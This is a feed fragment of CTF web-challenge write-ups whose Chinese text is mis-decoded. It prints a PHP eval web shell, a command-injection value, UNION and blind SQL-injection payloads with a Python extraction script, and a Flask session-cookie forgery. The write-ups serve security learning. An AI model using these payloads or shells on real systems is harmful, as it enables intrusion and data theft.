class=\"markdownIt-Anchor\" href=\"#5vim-yyds\">#</a> 5.Vim yyds</h2>\n<p>æ ¹æ®é¢˜ç›®æç¤ºæ˜¯ vim ä¿¡æ¯æ³„éœ²ï¼Œæ–‡ä»¶åç¼€åæ˜¯ <code>.index.php.swp</code> <br>\n ä¸‹è½½çš„æ–‡ä»¶æ”¾åˆ° kali æ¢å¤ä¸€ä¸‹ï¼Œ(vim -r index.php.swp), çœ‹ä»£ç çŸ¥é“ç”¨ post æ–¹å¼ä¼ ä¸€ä¸ª password, å€¼ä¸º base64 åŠ å¯†çš„ <code>Give_Me_Your_Flag</code> , å°±å¯ä»¥æ‰§è¡Œ post ä¼ çš„ cmd çš„å‘½ä»¤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"6ä½œä¸šç®¡ç†ç³»ç»Ÿ\"><a class=\"markdownIt-Anchor\" href=\"#6ä½œä¸šç®¡ç†ç³»ç»Ÿ\">#</a> 6. ä½œä¸šç®¡ç†ç³»ç»Ÿ</h2>\n<p>æºä»£ç æç¤ºé»˜è®¤ç”¨æˆ·åå¯†ç  admin, ç™»å½•è¿›å»ä¹‹é—´ä¼ é©¬ï¼Œ</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;zoe&#x27;</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">phpinfo</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ç›´æ¥æ”¹ url åˆ° zoe.php,hackbar ä¼  zoe=system (â€˜cat /flagâ€™);<br>\n æˆ–è€…ä¸å«Œéº»çƒ¦å¯ä»¥èšå‰‘è¿æ¥ï¼Œå¯†ç  zoe</p>\n<h2 id=\"71zjs\"><a class=\"markdownIt-Anchor\" href=\"#71zjs\">#</a> 7.1zjs</h2>\n<p>çœ‹æºä»£ç ï¼Œè¿›å…¥ /dist/index.umd.js, å‘ç° /f@k3f1ag.php å‘ç°ä¸€å † jsfuck ç¼–ç çš„æ•°æ®<br>\nè¿™é‡Œè¯´ä¸€ä¸‹ jsfuck:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å®ƒæ˜¯ç”±[]()!+è¿™å…­ä¸ªå­—ç¬¦æ¥ç¼–å†™çš„JavaScriptç¨‹åº,å¯è¢«ç”¨æ¥ç»•è¿‡xss</span><br></pre></td></tr></table></figure>\n<p>æŠŠç½‘é¡µçš„ jsfuck ç¼–ç è§£ç å°±å¾—åˆ° flag<br>\n è§£ç ç½‘ç«™:<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vanNmdWNrLmh0bWw=\">http://www.hiencode.com/jsfuck.html</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;92f549a0-17aa-47ce-bb48-a5c506904cea&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"8http-pro-max-plus\"><a class=\"markdownIt-Anchor\" href=\"#8http-pro-max-plus\">#</a> 8.Http pro max plus</h2>\n<p>ç»å…¸çš„ç­¾åˆ°é¢˜<br>\nå…ˆæœ¬åœ°è®¿é—®ï¼šX-Forwarded-For: 127.0.0.1 ä¸è¡Œï¼Œæ¢ Client-Ip: 127.0.0.1<br>\n ä¼ªé€ æ¥æºï¼šReferer: <span class=\"exturl\" data-url=\"aHR0cDovL3Bvcm5odWIuY29t\">pornhub.com</span><br>\n æ”¹æµè§ˆå™¨ï¼šUser-Agent: Chrome<br>\n æŒ‚ä»£ç†ï¼šè¿™é‡Œæ–°å­¦åˆ°äº†ä¸€ä¸ª Vis<br>\nVia: Clash.win<br>\n ç„¶åæç¤ºå» /wtfwtfwtfwtf.php<br>\n çœ‹æºä»£ç å‘ç° /sejishikong.php<br>\n è¿›å…¥å¾—åˆ° flag<br>\n![[Pasted image 20230513183204.png]]</p>\n<h2 id=\"9ping\"><a class=\"markdownIt-Anchor\" href=\"#9ping\">#</a> 9.Ping</h2>\n<p>çœ‹æºä»£ç å‘ç°å¯¹è¾“å…¥è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œæ²¡åŠæ³•æ¢ä¸ªæ€è·¯ï¼šæŠ“åŒ…<br>\nå‘ç°å¯ä»¥ç›´æ¥åœ¨ command=127.0.0.1 åé¢åŠ ä»»ä½•å‘½ä»¤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command=127.0.0.1||cat /flag&amp;ping=Ping</span><br></pre></td></tr></table></figure>\n<p>![[Pasted image 20230513102259.png]]</p>\n<h2 id=\"10è¿™æ˜¯ä»€ä¹ˆsql-æ³¨ä¸€ä¸‹\"><a class=\"markdownIt-Anchor\" href=\"#10è¿™æ˜¯ä»€ä¹ˆsql-æ³¨ä¸€ä¸‹\">#</a> 10. è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼</h2>\n<p>get å‹ï¼Œâ€“+ ç”¨ä¸äº†ï¼Œç”¨ %23 ç»•è¿‡å³å¯<br>\næ³¨æ„:<mark> è¿™é‡Œåœ¨è¾“å…¥æ¡†è¾“å…¥ %23 æ²¡æœ‰ç”¨ï¼Œè¦åœ¨ hackbar é‡Œè¾“å…¥ï¼Œè€Œè¾“å…¥æ¡†å¯ä»¥è¾“å…¥#</mark><br>\nä¸‹é¢ç”¨ hackbar ä¼ å‚:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">åˆ¤æ–­ä¸¤ä¸ªå­—æ®µ,3å¤±è´¥</span><br><span class=\"line\">1)))))) order by 2%23</span><br><span class=\"line\">åˆ¤æ–­å›æ˜¾ä½,ç»“æœæ˜¯1,2</span><br><span class=\"line\">-1)))))) union select 1,2%23</span><br><span class=\"line\">çˆ†è¡¨åä¸ºusers</span><br><span class=\"line\">-1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()%23</span><br><span class=\"line\">çˆ†å­—æ®µåä¸ºid,username,password</span><br><span class=\"line\">-1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class=\"line\">çˆ†å†…å®¹</span><br><span class=\"line\">-1)))))) union select 1,group_concat(password)from users%23</span><br><span class=\"line\">F1rst_to_Th3_eggggggggg!&#125;è¿™æ˜¯åé¢é¢˜çš„å½©è›‹</span><br><span class=\"line\"></span><br><span class=\"line\">çœ‹ä¸‹å½“å‰æ•°æ®åº“æ˜¯ä»€ä¹ˆ? ctf</span><br><span class=\"line\">-1)))))) union select 1,database()%23 </span><br><span class=\"line\">çœ‹ä¸‹æ‰€æœ‰æ•°æ®åº“å</span><br><span class=\"line\">-1)))))) union select 1,schema_name from information_schema.schemata%23</span><br><span class=\"line\">  </span><br><span class=\"line\">Array ( [0] =&gt; Array ( [username] =&gt; 1 [password] =&gt; information_schema ) [1] =&gt; Array ( [username] =&gt; 1 [password] =&gt; mysql ) [2] =&gt; Array ( [username] =&gt; 1 [password] =&gt; ctftraining ) [3] =&gt; Array ( [username] =&gt; 1 [password] =&gt; performance_schema ) [4] =&gt; Array ( [username] =&gt; 1 [password] =&gt; test ) [5] =&gt; Array ( [username] =&gt; 1 [password] =&gt; ctf ) )</span><br><span class=\"line\"></span><br><span class=\"line\">å¯èƒ½åœ¨ctftrainingé‡Œ</span><br><span class=\"line\">-1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctftraining&#x27;%23</span><br><span class=\"line\"></span><br><span class=\"line\">flag,news,users</span><br><span class=\"line\">ç„¶åæŸ¥flagè¡¨</span><br><span class=\"line\">-1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_schema=&#x27;ctftraining&#x27; and table_name=&#x27;flag&#x27;%23</span><br><span class=\"line\">æŸ¥åˆ°ä¸€ä¸ªå­—æ®µflag</span><br><span class=\"line\">ç›´æ¥çˆ†å†…å®¹</span><br><span class=\"line\">-1)))))) union select 1,group_concat(flag)from ctftraining.flag%23</span><br><span class=\"line\"></span><br><span class=\"line\">å¾—åˆ°flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"11å½©è›‹\"><a class=\"markdownIt-Anchor\" href=\"#11å½©è›‹\">#</a> 11. å½©è›‹</h2>\n<p>æˆ‘ FLAG å‘¢:/assets/js/script.min.js é‡Œæœ‰ LitCTF {First_t0_The_k3y! (1/?)</p>\n<p>Follow me and hack me: è§£å‡º flag åæç¤ºäº†å¤‡ä»½æ–‡ä»¶ï¼Œdirsearch ä¸€æ‰«å‘ç° www.zip, å¾—åˆ°ç©ºçš„ flag.php å’Œ index.php.bak, æ”¹åç¼€åä¸º index.php å¾—åˆ°ç¬¬äºŒä¸ªå½©è›‹:<br>\n// ç¬¬ä¸‰ä¸ªå½©è›‹ï¼(çœ‹è¿‡å¤´å·ç©å®¶ä¹ˆï¼Ÿ)<br>\n// <em>R3ady_Pl4yer_000ne</em> (3/?)</p>\n<p>ä½œä¸šç®¡ç†ç³»ç»Ÿï¼šè¿œç¨‹ä¸‹è½½çš„é»˜è®¤é“¾æ¥ï¼Œè®¿é—®æœ‰:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wow ä½ æ‰¾åˆ°äº†ç¬¬äºŒä¸ªå½©è›‹å“¦~</span><br><span class=\"line\">_S0_ne3t? (2/?)</span><br></pre></td></tr></table></figure>\n<p>SQL æ³¨å…¥ï¼šF1rst_to_Th3_eggggggggg!}<br>\n æ‹¼æ¥:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"12å°±å½“æ— äº‹å‘ç”Ÿ\"><a class=\"markdownIt-Anchor\" href=\"#12å°±å½“æ— äº‹å‘ç”Ÿ\">#</a> 12. å°±å½“æ— äº‹å‘ç”Ÿ</h2>\n<p>å» tanji çš„ GitHub é¡¹ç›®é‚£é‡Œæ‰¾ commit å°±èƒ½æ‰¾åˆ° flag</p>\n<h2 id=\"13flagç‚¹å‡»å°±é€\"><a class=\"markdownIt-Anchor\" href=\"#13flagç‚¹å‡»å°±é€\">#</a> 13.Flag ç‚¹å‡»å°±é€</h2>\n<p>è¾“å…¥ admin è‚¯å®šè¿”å›ä½ æ€ä¹ˆå¯èƒ½æ˜¯ç®¡ç†å‘˜å“¦ï¼Œè¾“å…¥åˆ«çš„åå­—æäº¤ä¼šæœ‰ session, æ­¤é¢˜è€ƒç‚¹:session ä¼ªé€ </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å‡å¦‚æˆ‘è¿™é‡Œè¾“å…¥çš„ç”¨æˆ·åæ˜¯hq</span><br><span class=\"line\">å¾—åˆ°çš„sessionæ˜¯eyJuYW1lIjoiaHEifQ.ZGDn7w.SuMQs-qX-3RHMwnz7sTe2Yr25ck</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œæ¨èä¸€ä¸ªå·¥å…·:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vcmFqL2ZsYXNrLXNlc3Npb24tY29va2llLW1hbmFnZXI=\">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py decode -s &#x27;LitCTF&#x27; -c &quot;eyJuYW1lIjoiaHEifQ.ZGDn7w.SuMQs-qX-3RHMwnz7sTe2Yr25ck&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">è¿™é‡Œ-sæ˜¯è§£å¯†å¯†é’¥,çŒœçš„LitCTF,-cæ˜¯è¦è§£å¯†çš„cookie</span><br><span class=\"line\">&#123;&#x27;name&#x27;: &#x27;hq&#x27;&#125;</span><br></pre></td></tr></table></figure>\n<p>ç„¶å</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py encode -s &#x27;LitCTF&#x27; -t &quot;&#123;&#x27;name&#x27;:&#x27;admin&#x27;&#125;&quot;</span><br><span class=\"line\">è¿™é‡Œ-tæ˜¯cookieçš„ç»“æ„,-sæ˜¯åŠ å¯†çš„å¯†é’¥</span><br><span class=\"line\">å¾—åˆ°:</span><br><span class=\"line\">eyJuYW1lIjoiYWRtaW4ifQ.ZGDt_w.GoKagALqsLhtbwEF92uM00oiMJE</span><br><span class=\"line\">ç‚¹å‡»æ‹¿flagæ—¶çš„cookieçš„sessionæ¢ä¸Šè¿™ä¸ªå°±èƒ½æ‹¿flagäº†</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/12/nssctf2/",
            "url": "https://hq185187.github.io/2023/05/12/nssctf2/",
            "title": "NSSCTF2",
            "date_published": "2023-05-12T08:31:39.086Z",
            "content_html": "<h3 id=\"15ciscn-2019ååŒ—day2web1\"><a class=\"markdownIt-Anchor\" href=\"#15ciscn-2019ååŒ—day2web1\">#</a> 15.[CISCN 2019 ååŒ— Day2] Web1</h3>\n<p>é¢˜ç›®è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬ç©ºæ ¼<br>\nè¾“å…¥ 1â€™%0a å›æ˜¾ bool (flase)<br>\n è¯´æ˜è¿™æ˜¯ä¸€ä¸ªæœ‰è¿‡æ»¤çš„å¸ƒå°”ç›²æ³¨ç±»å‹çš„é¢˜<br>\nå‘Šè¯‰äº†è¡¨åå­—æ®µåéƒ½æ˜¯ flag,sql è¯­å¥å°±æ˜¯:select (flag) from (flag)<mark> å› ä¸ºè¿‡æ»¤äº†ç©ºæ ¼</mark><br>\nå†™ python è„šæœ¬</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">res=<span class=\"string\">&quot;&quot;</span>  </span><br><span class=\"line\">url=<span class=\"built_in\">input</span>(<span class=\"string\">&quot;è¯·è¾“å…¥é“¾æ¥: &quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">60</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> string.printable:  <span class=\"comment\">#è¿™ä¸ªæ˜¯å¯è¾“å‡ºå­—ç¬¦,jä¼šä¸æ–­éå†é‡Œé¢çš„å€¼</span></span><br><span class=\"line\">sql=<span class=\"string\">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;,1,2)&#x27;</span>.<span class=\"built_in\">format</span>(i,<span class=\"built_in\">ord</span>(j))  </span><br><span class=\"line\"><span class=\"comment\">#è¿™é‡Œè®©flagçš„ç¬¬iä¸ªå€¼å˜æˆasciiçœ‹çœ‹æ˜¯å¦ç­‰äºjçš„ord,ç­‰äºå°±è¿”å›1,å¦åˆ™è¿”å›2</span></span><br><span class=\"line\">post=&#123;<span class=\"string\">&quot;id&quot;</span>:sql&#125;  </span><br><span class=\"line\">result=requests.post(url=url,data=post)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello&quot;</span> <span class=\"keyword\">in</span> result.text:  </span><br><span class=\"line\">res+=j  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"16hctf-2018warmup\"><a class=\"markdownIt-Anchor\" href=\"#16hctf-2018warmup\">#</a> 16.[HCTF 2018]Warmup</h3>\n<p>é¦–å…ˆæ‰“å¼€é¢˜ç›®çœ‹æºç ï¼Œå‘ç° source.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\">&amp;<span class=\"variable\">$page</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&quot;source&quot;</span> =&gt; <span class=\"string\">&quot;source.php&quot;</span>, <span class=\"string\">&quot;hint&quot;</span> =&gt; <span class=\"string\">&quot;hint.php&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$page</span>) || !<span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$page</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$page</span>, <span class=\"variable\">$whitelist</span>)) &#123;<span class=\"comment\">//æ£€æŸ¥ä¼ çš„fileå€¼æ˜¯å¦å†whitelistä¸­</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">mb_substr</span>(</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable\">$page</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"number\">0</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"title function_ invoke__\">mb_strpos</span>(<span class=\"variable\">$page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  );</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$page</span>);<span class=\"comment\">//å°†fileè¿›è¡Œurlè§£ç èµ‹å€¼ç»™$_page</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">mb_substr</span>(//ç›¸å½“äºsubstr,å¯ä»¥è¿”å›ä¸­æ–‡å­—ç¬¦</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable\">$_page</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"number\">0</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"title function_ invoke__\">mb_strpos</span>(<span class=\"variable\">$_page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)//ç»™_pageååŠ ä¸ª?,å†è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°?çš„ä½ç½®</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  );</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//è¦ä¼ ä¸ªå‚åå­—ä¸ºfile</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//ä¼ çš„fileè¦æ˜¯å­—ç¬¦ä¸²</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &amp;&amp; emmm::<span class=\"title function_ invoke__\">checkFile</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//è°ƒç”¨checkFileå‡½æ•°åªè¦èƒ½é€šè¿‡å°±è¡Œ</span></span><br><span class=\"line\"></span><br><span class=\"line\">) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">include</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>];<span class=\"comment\">//ç›´æ¥è°ƒç”¨å¾—flag</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">exit</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span 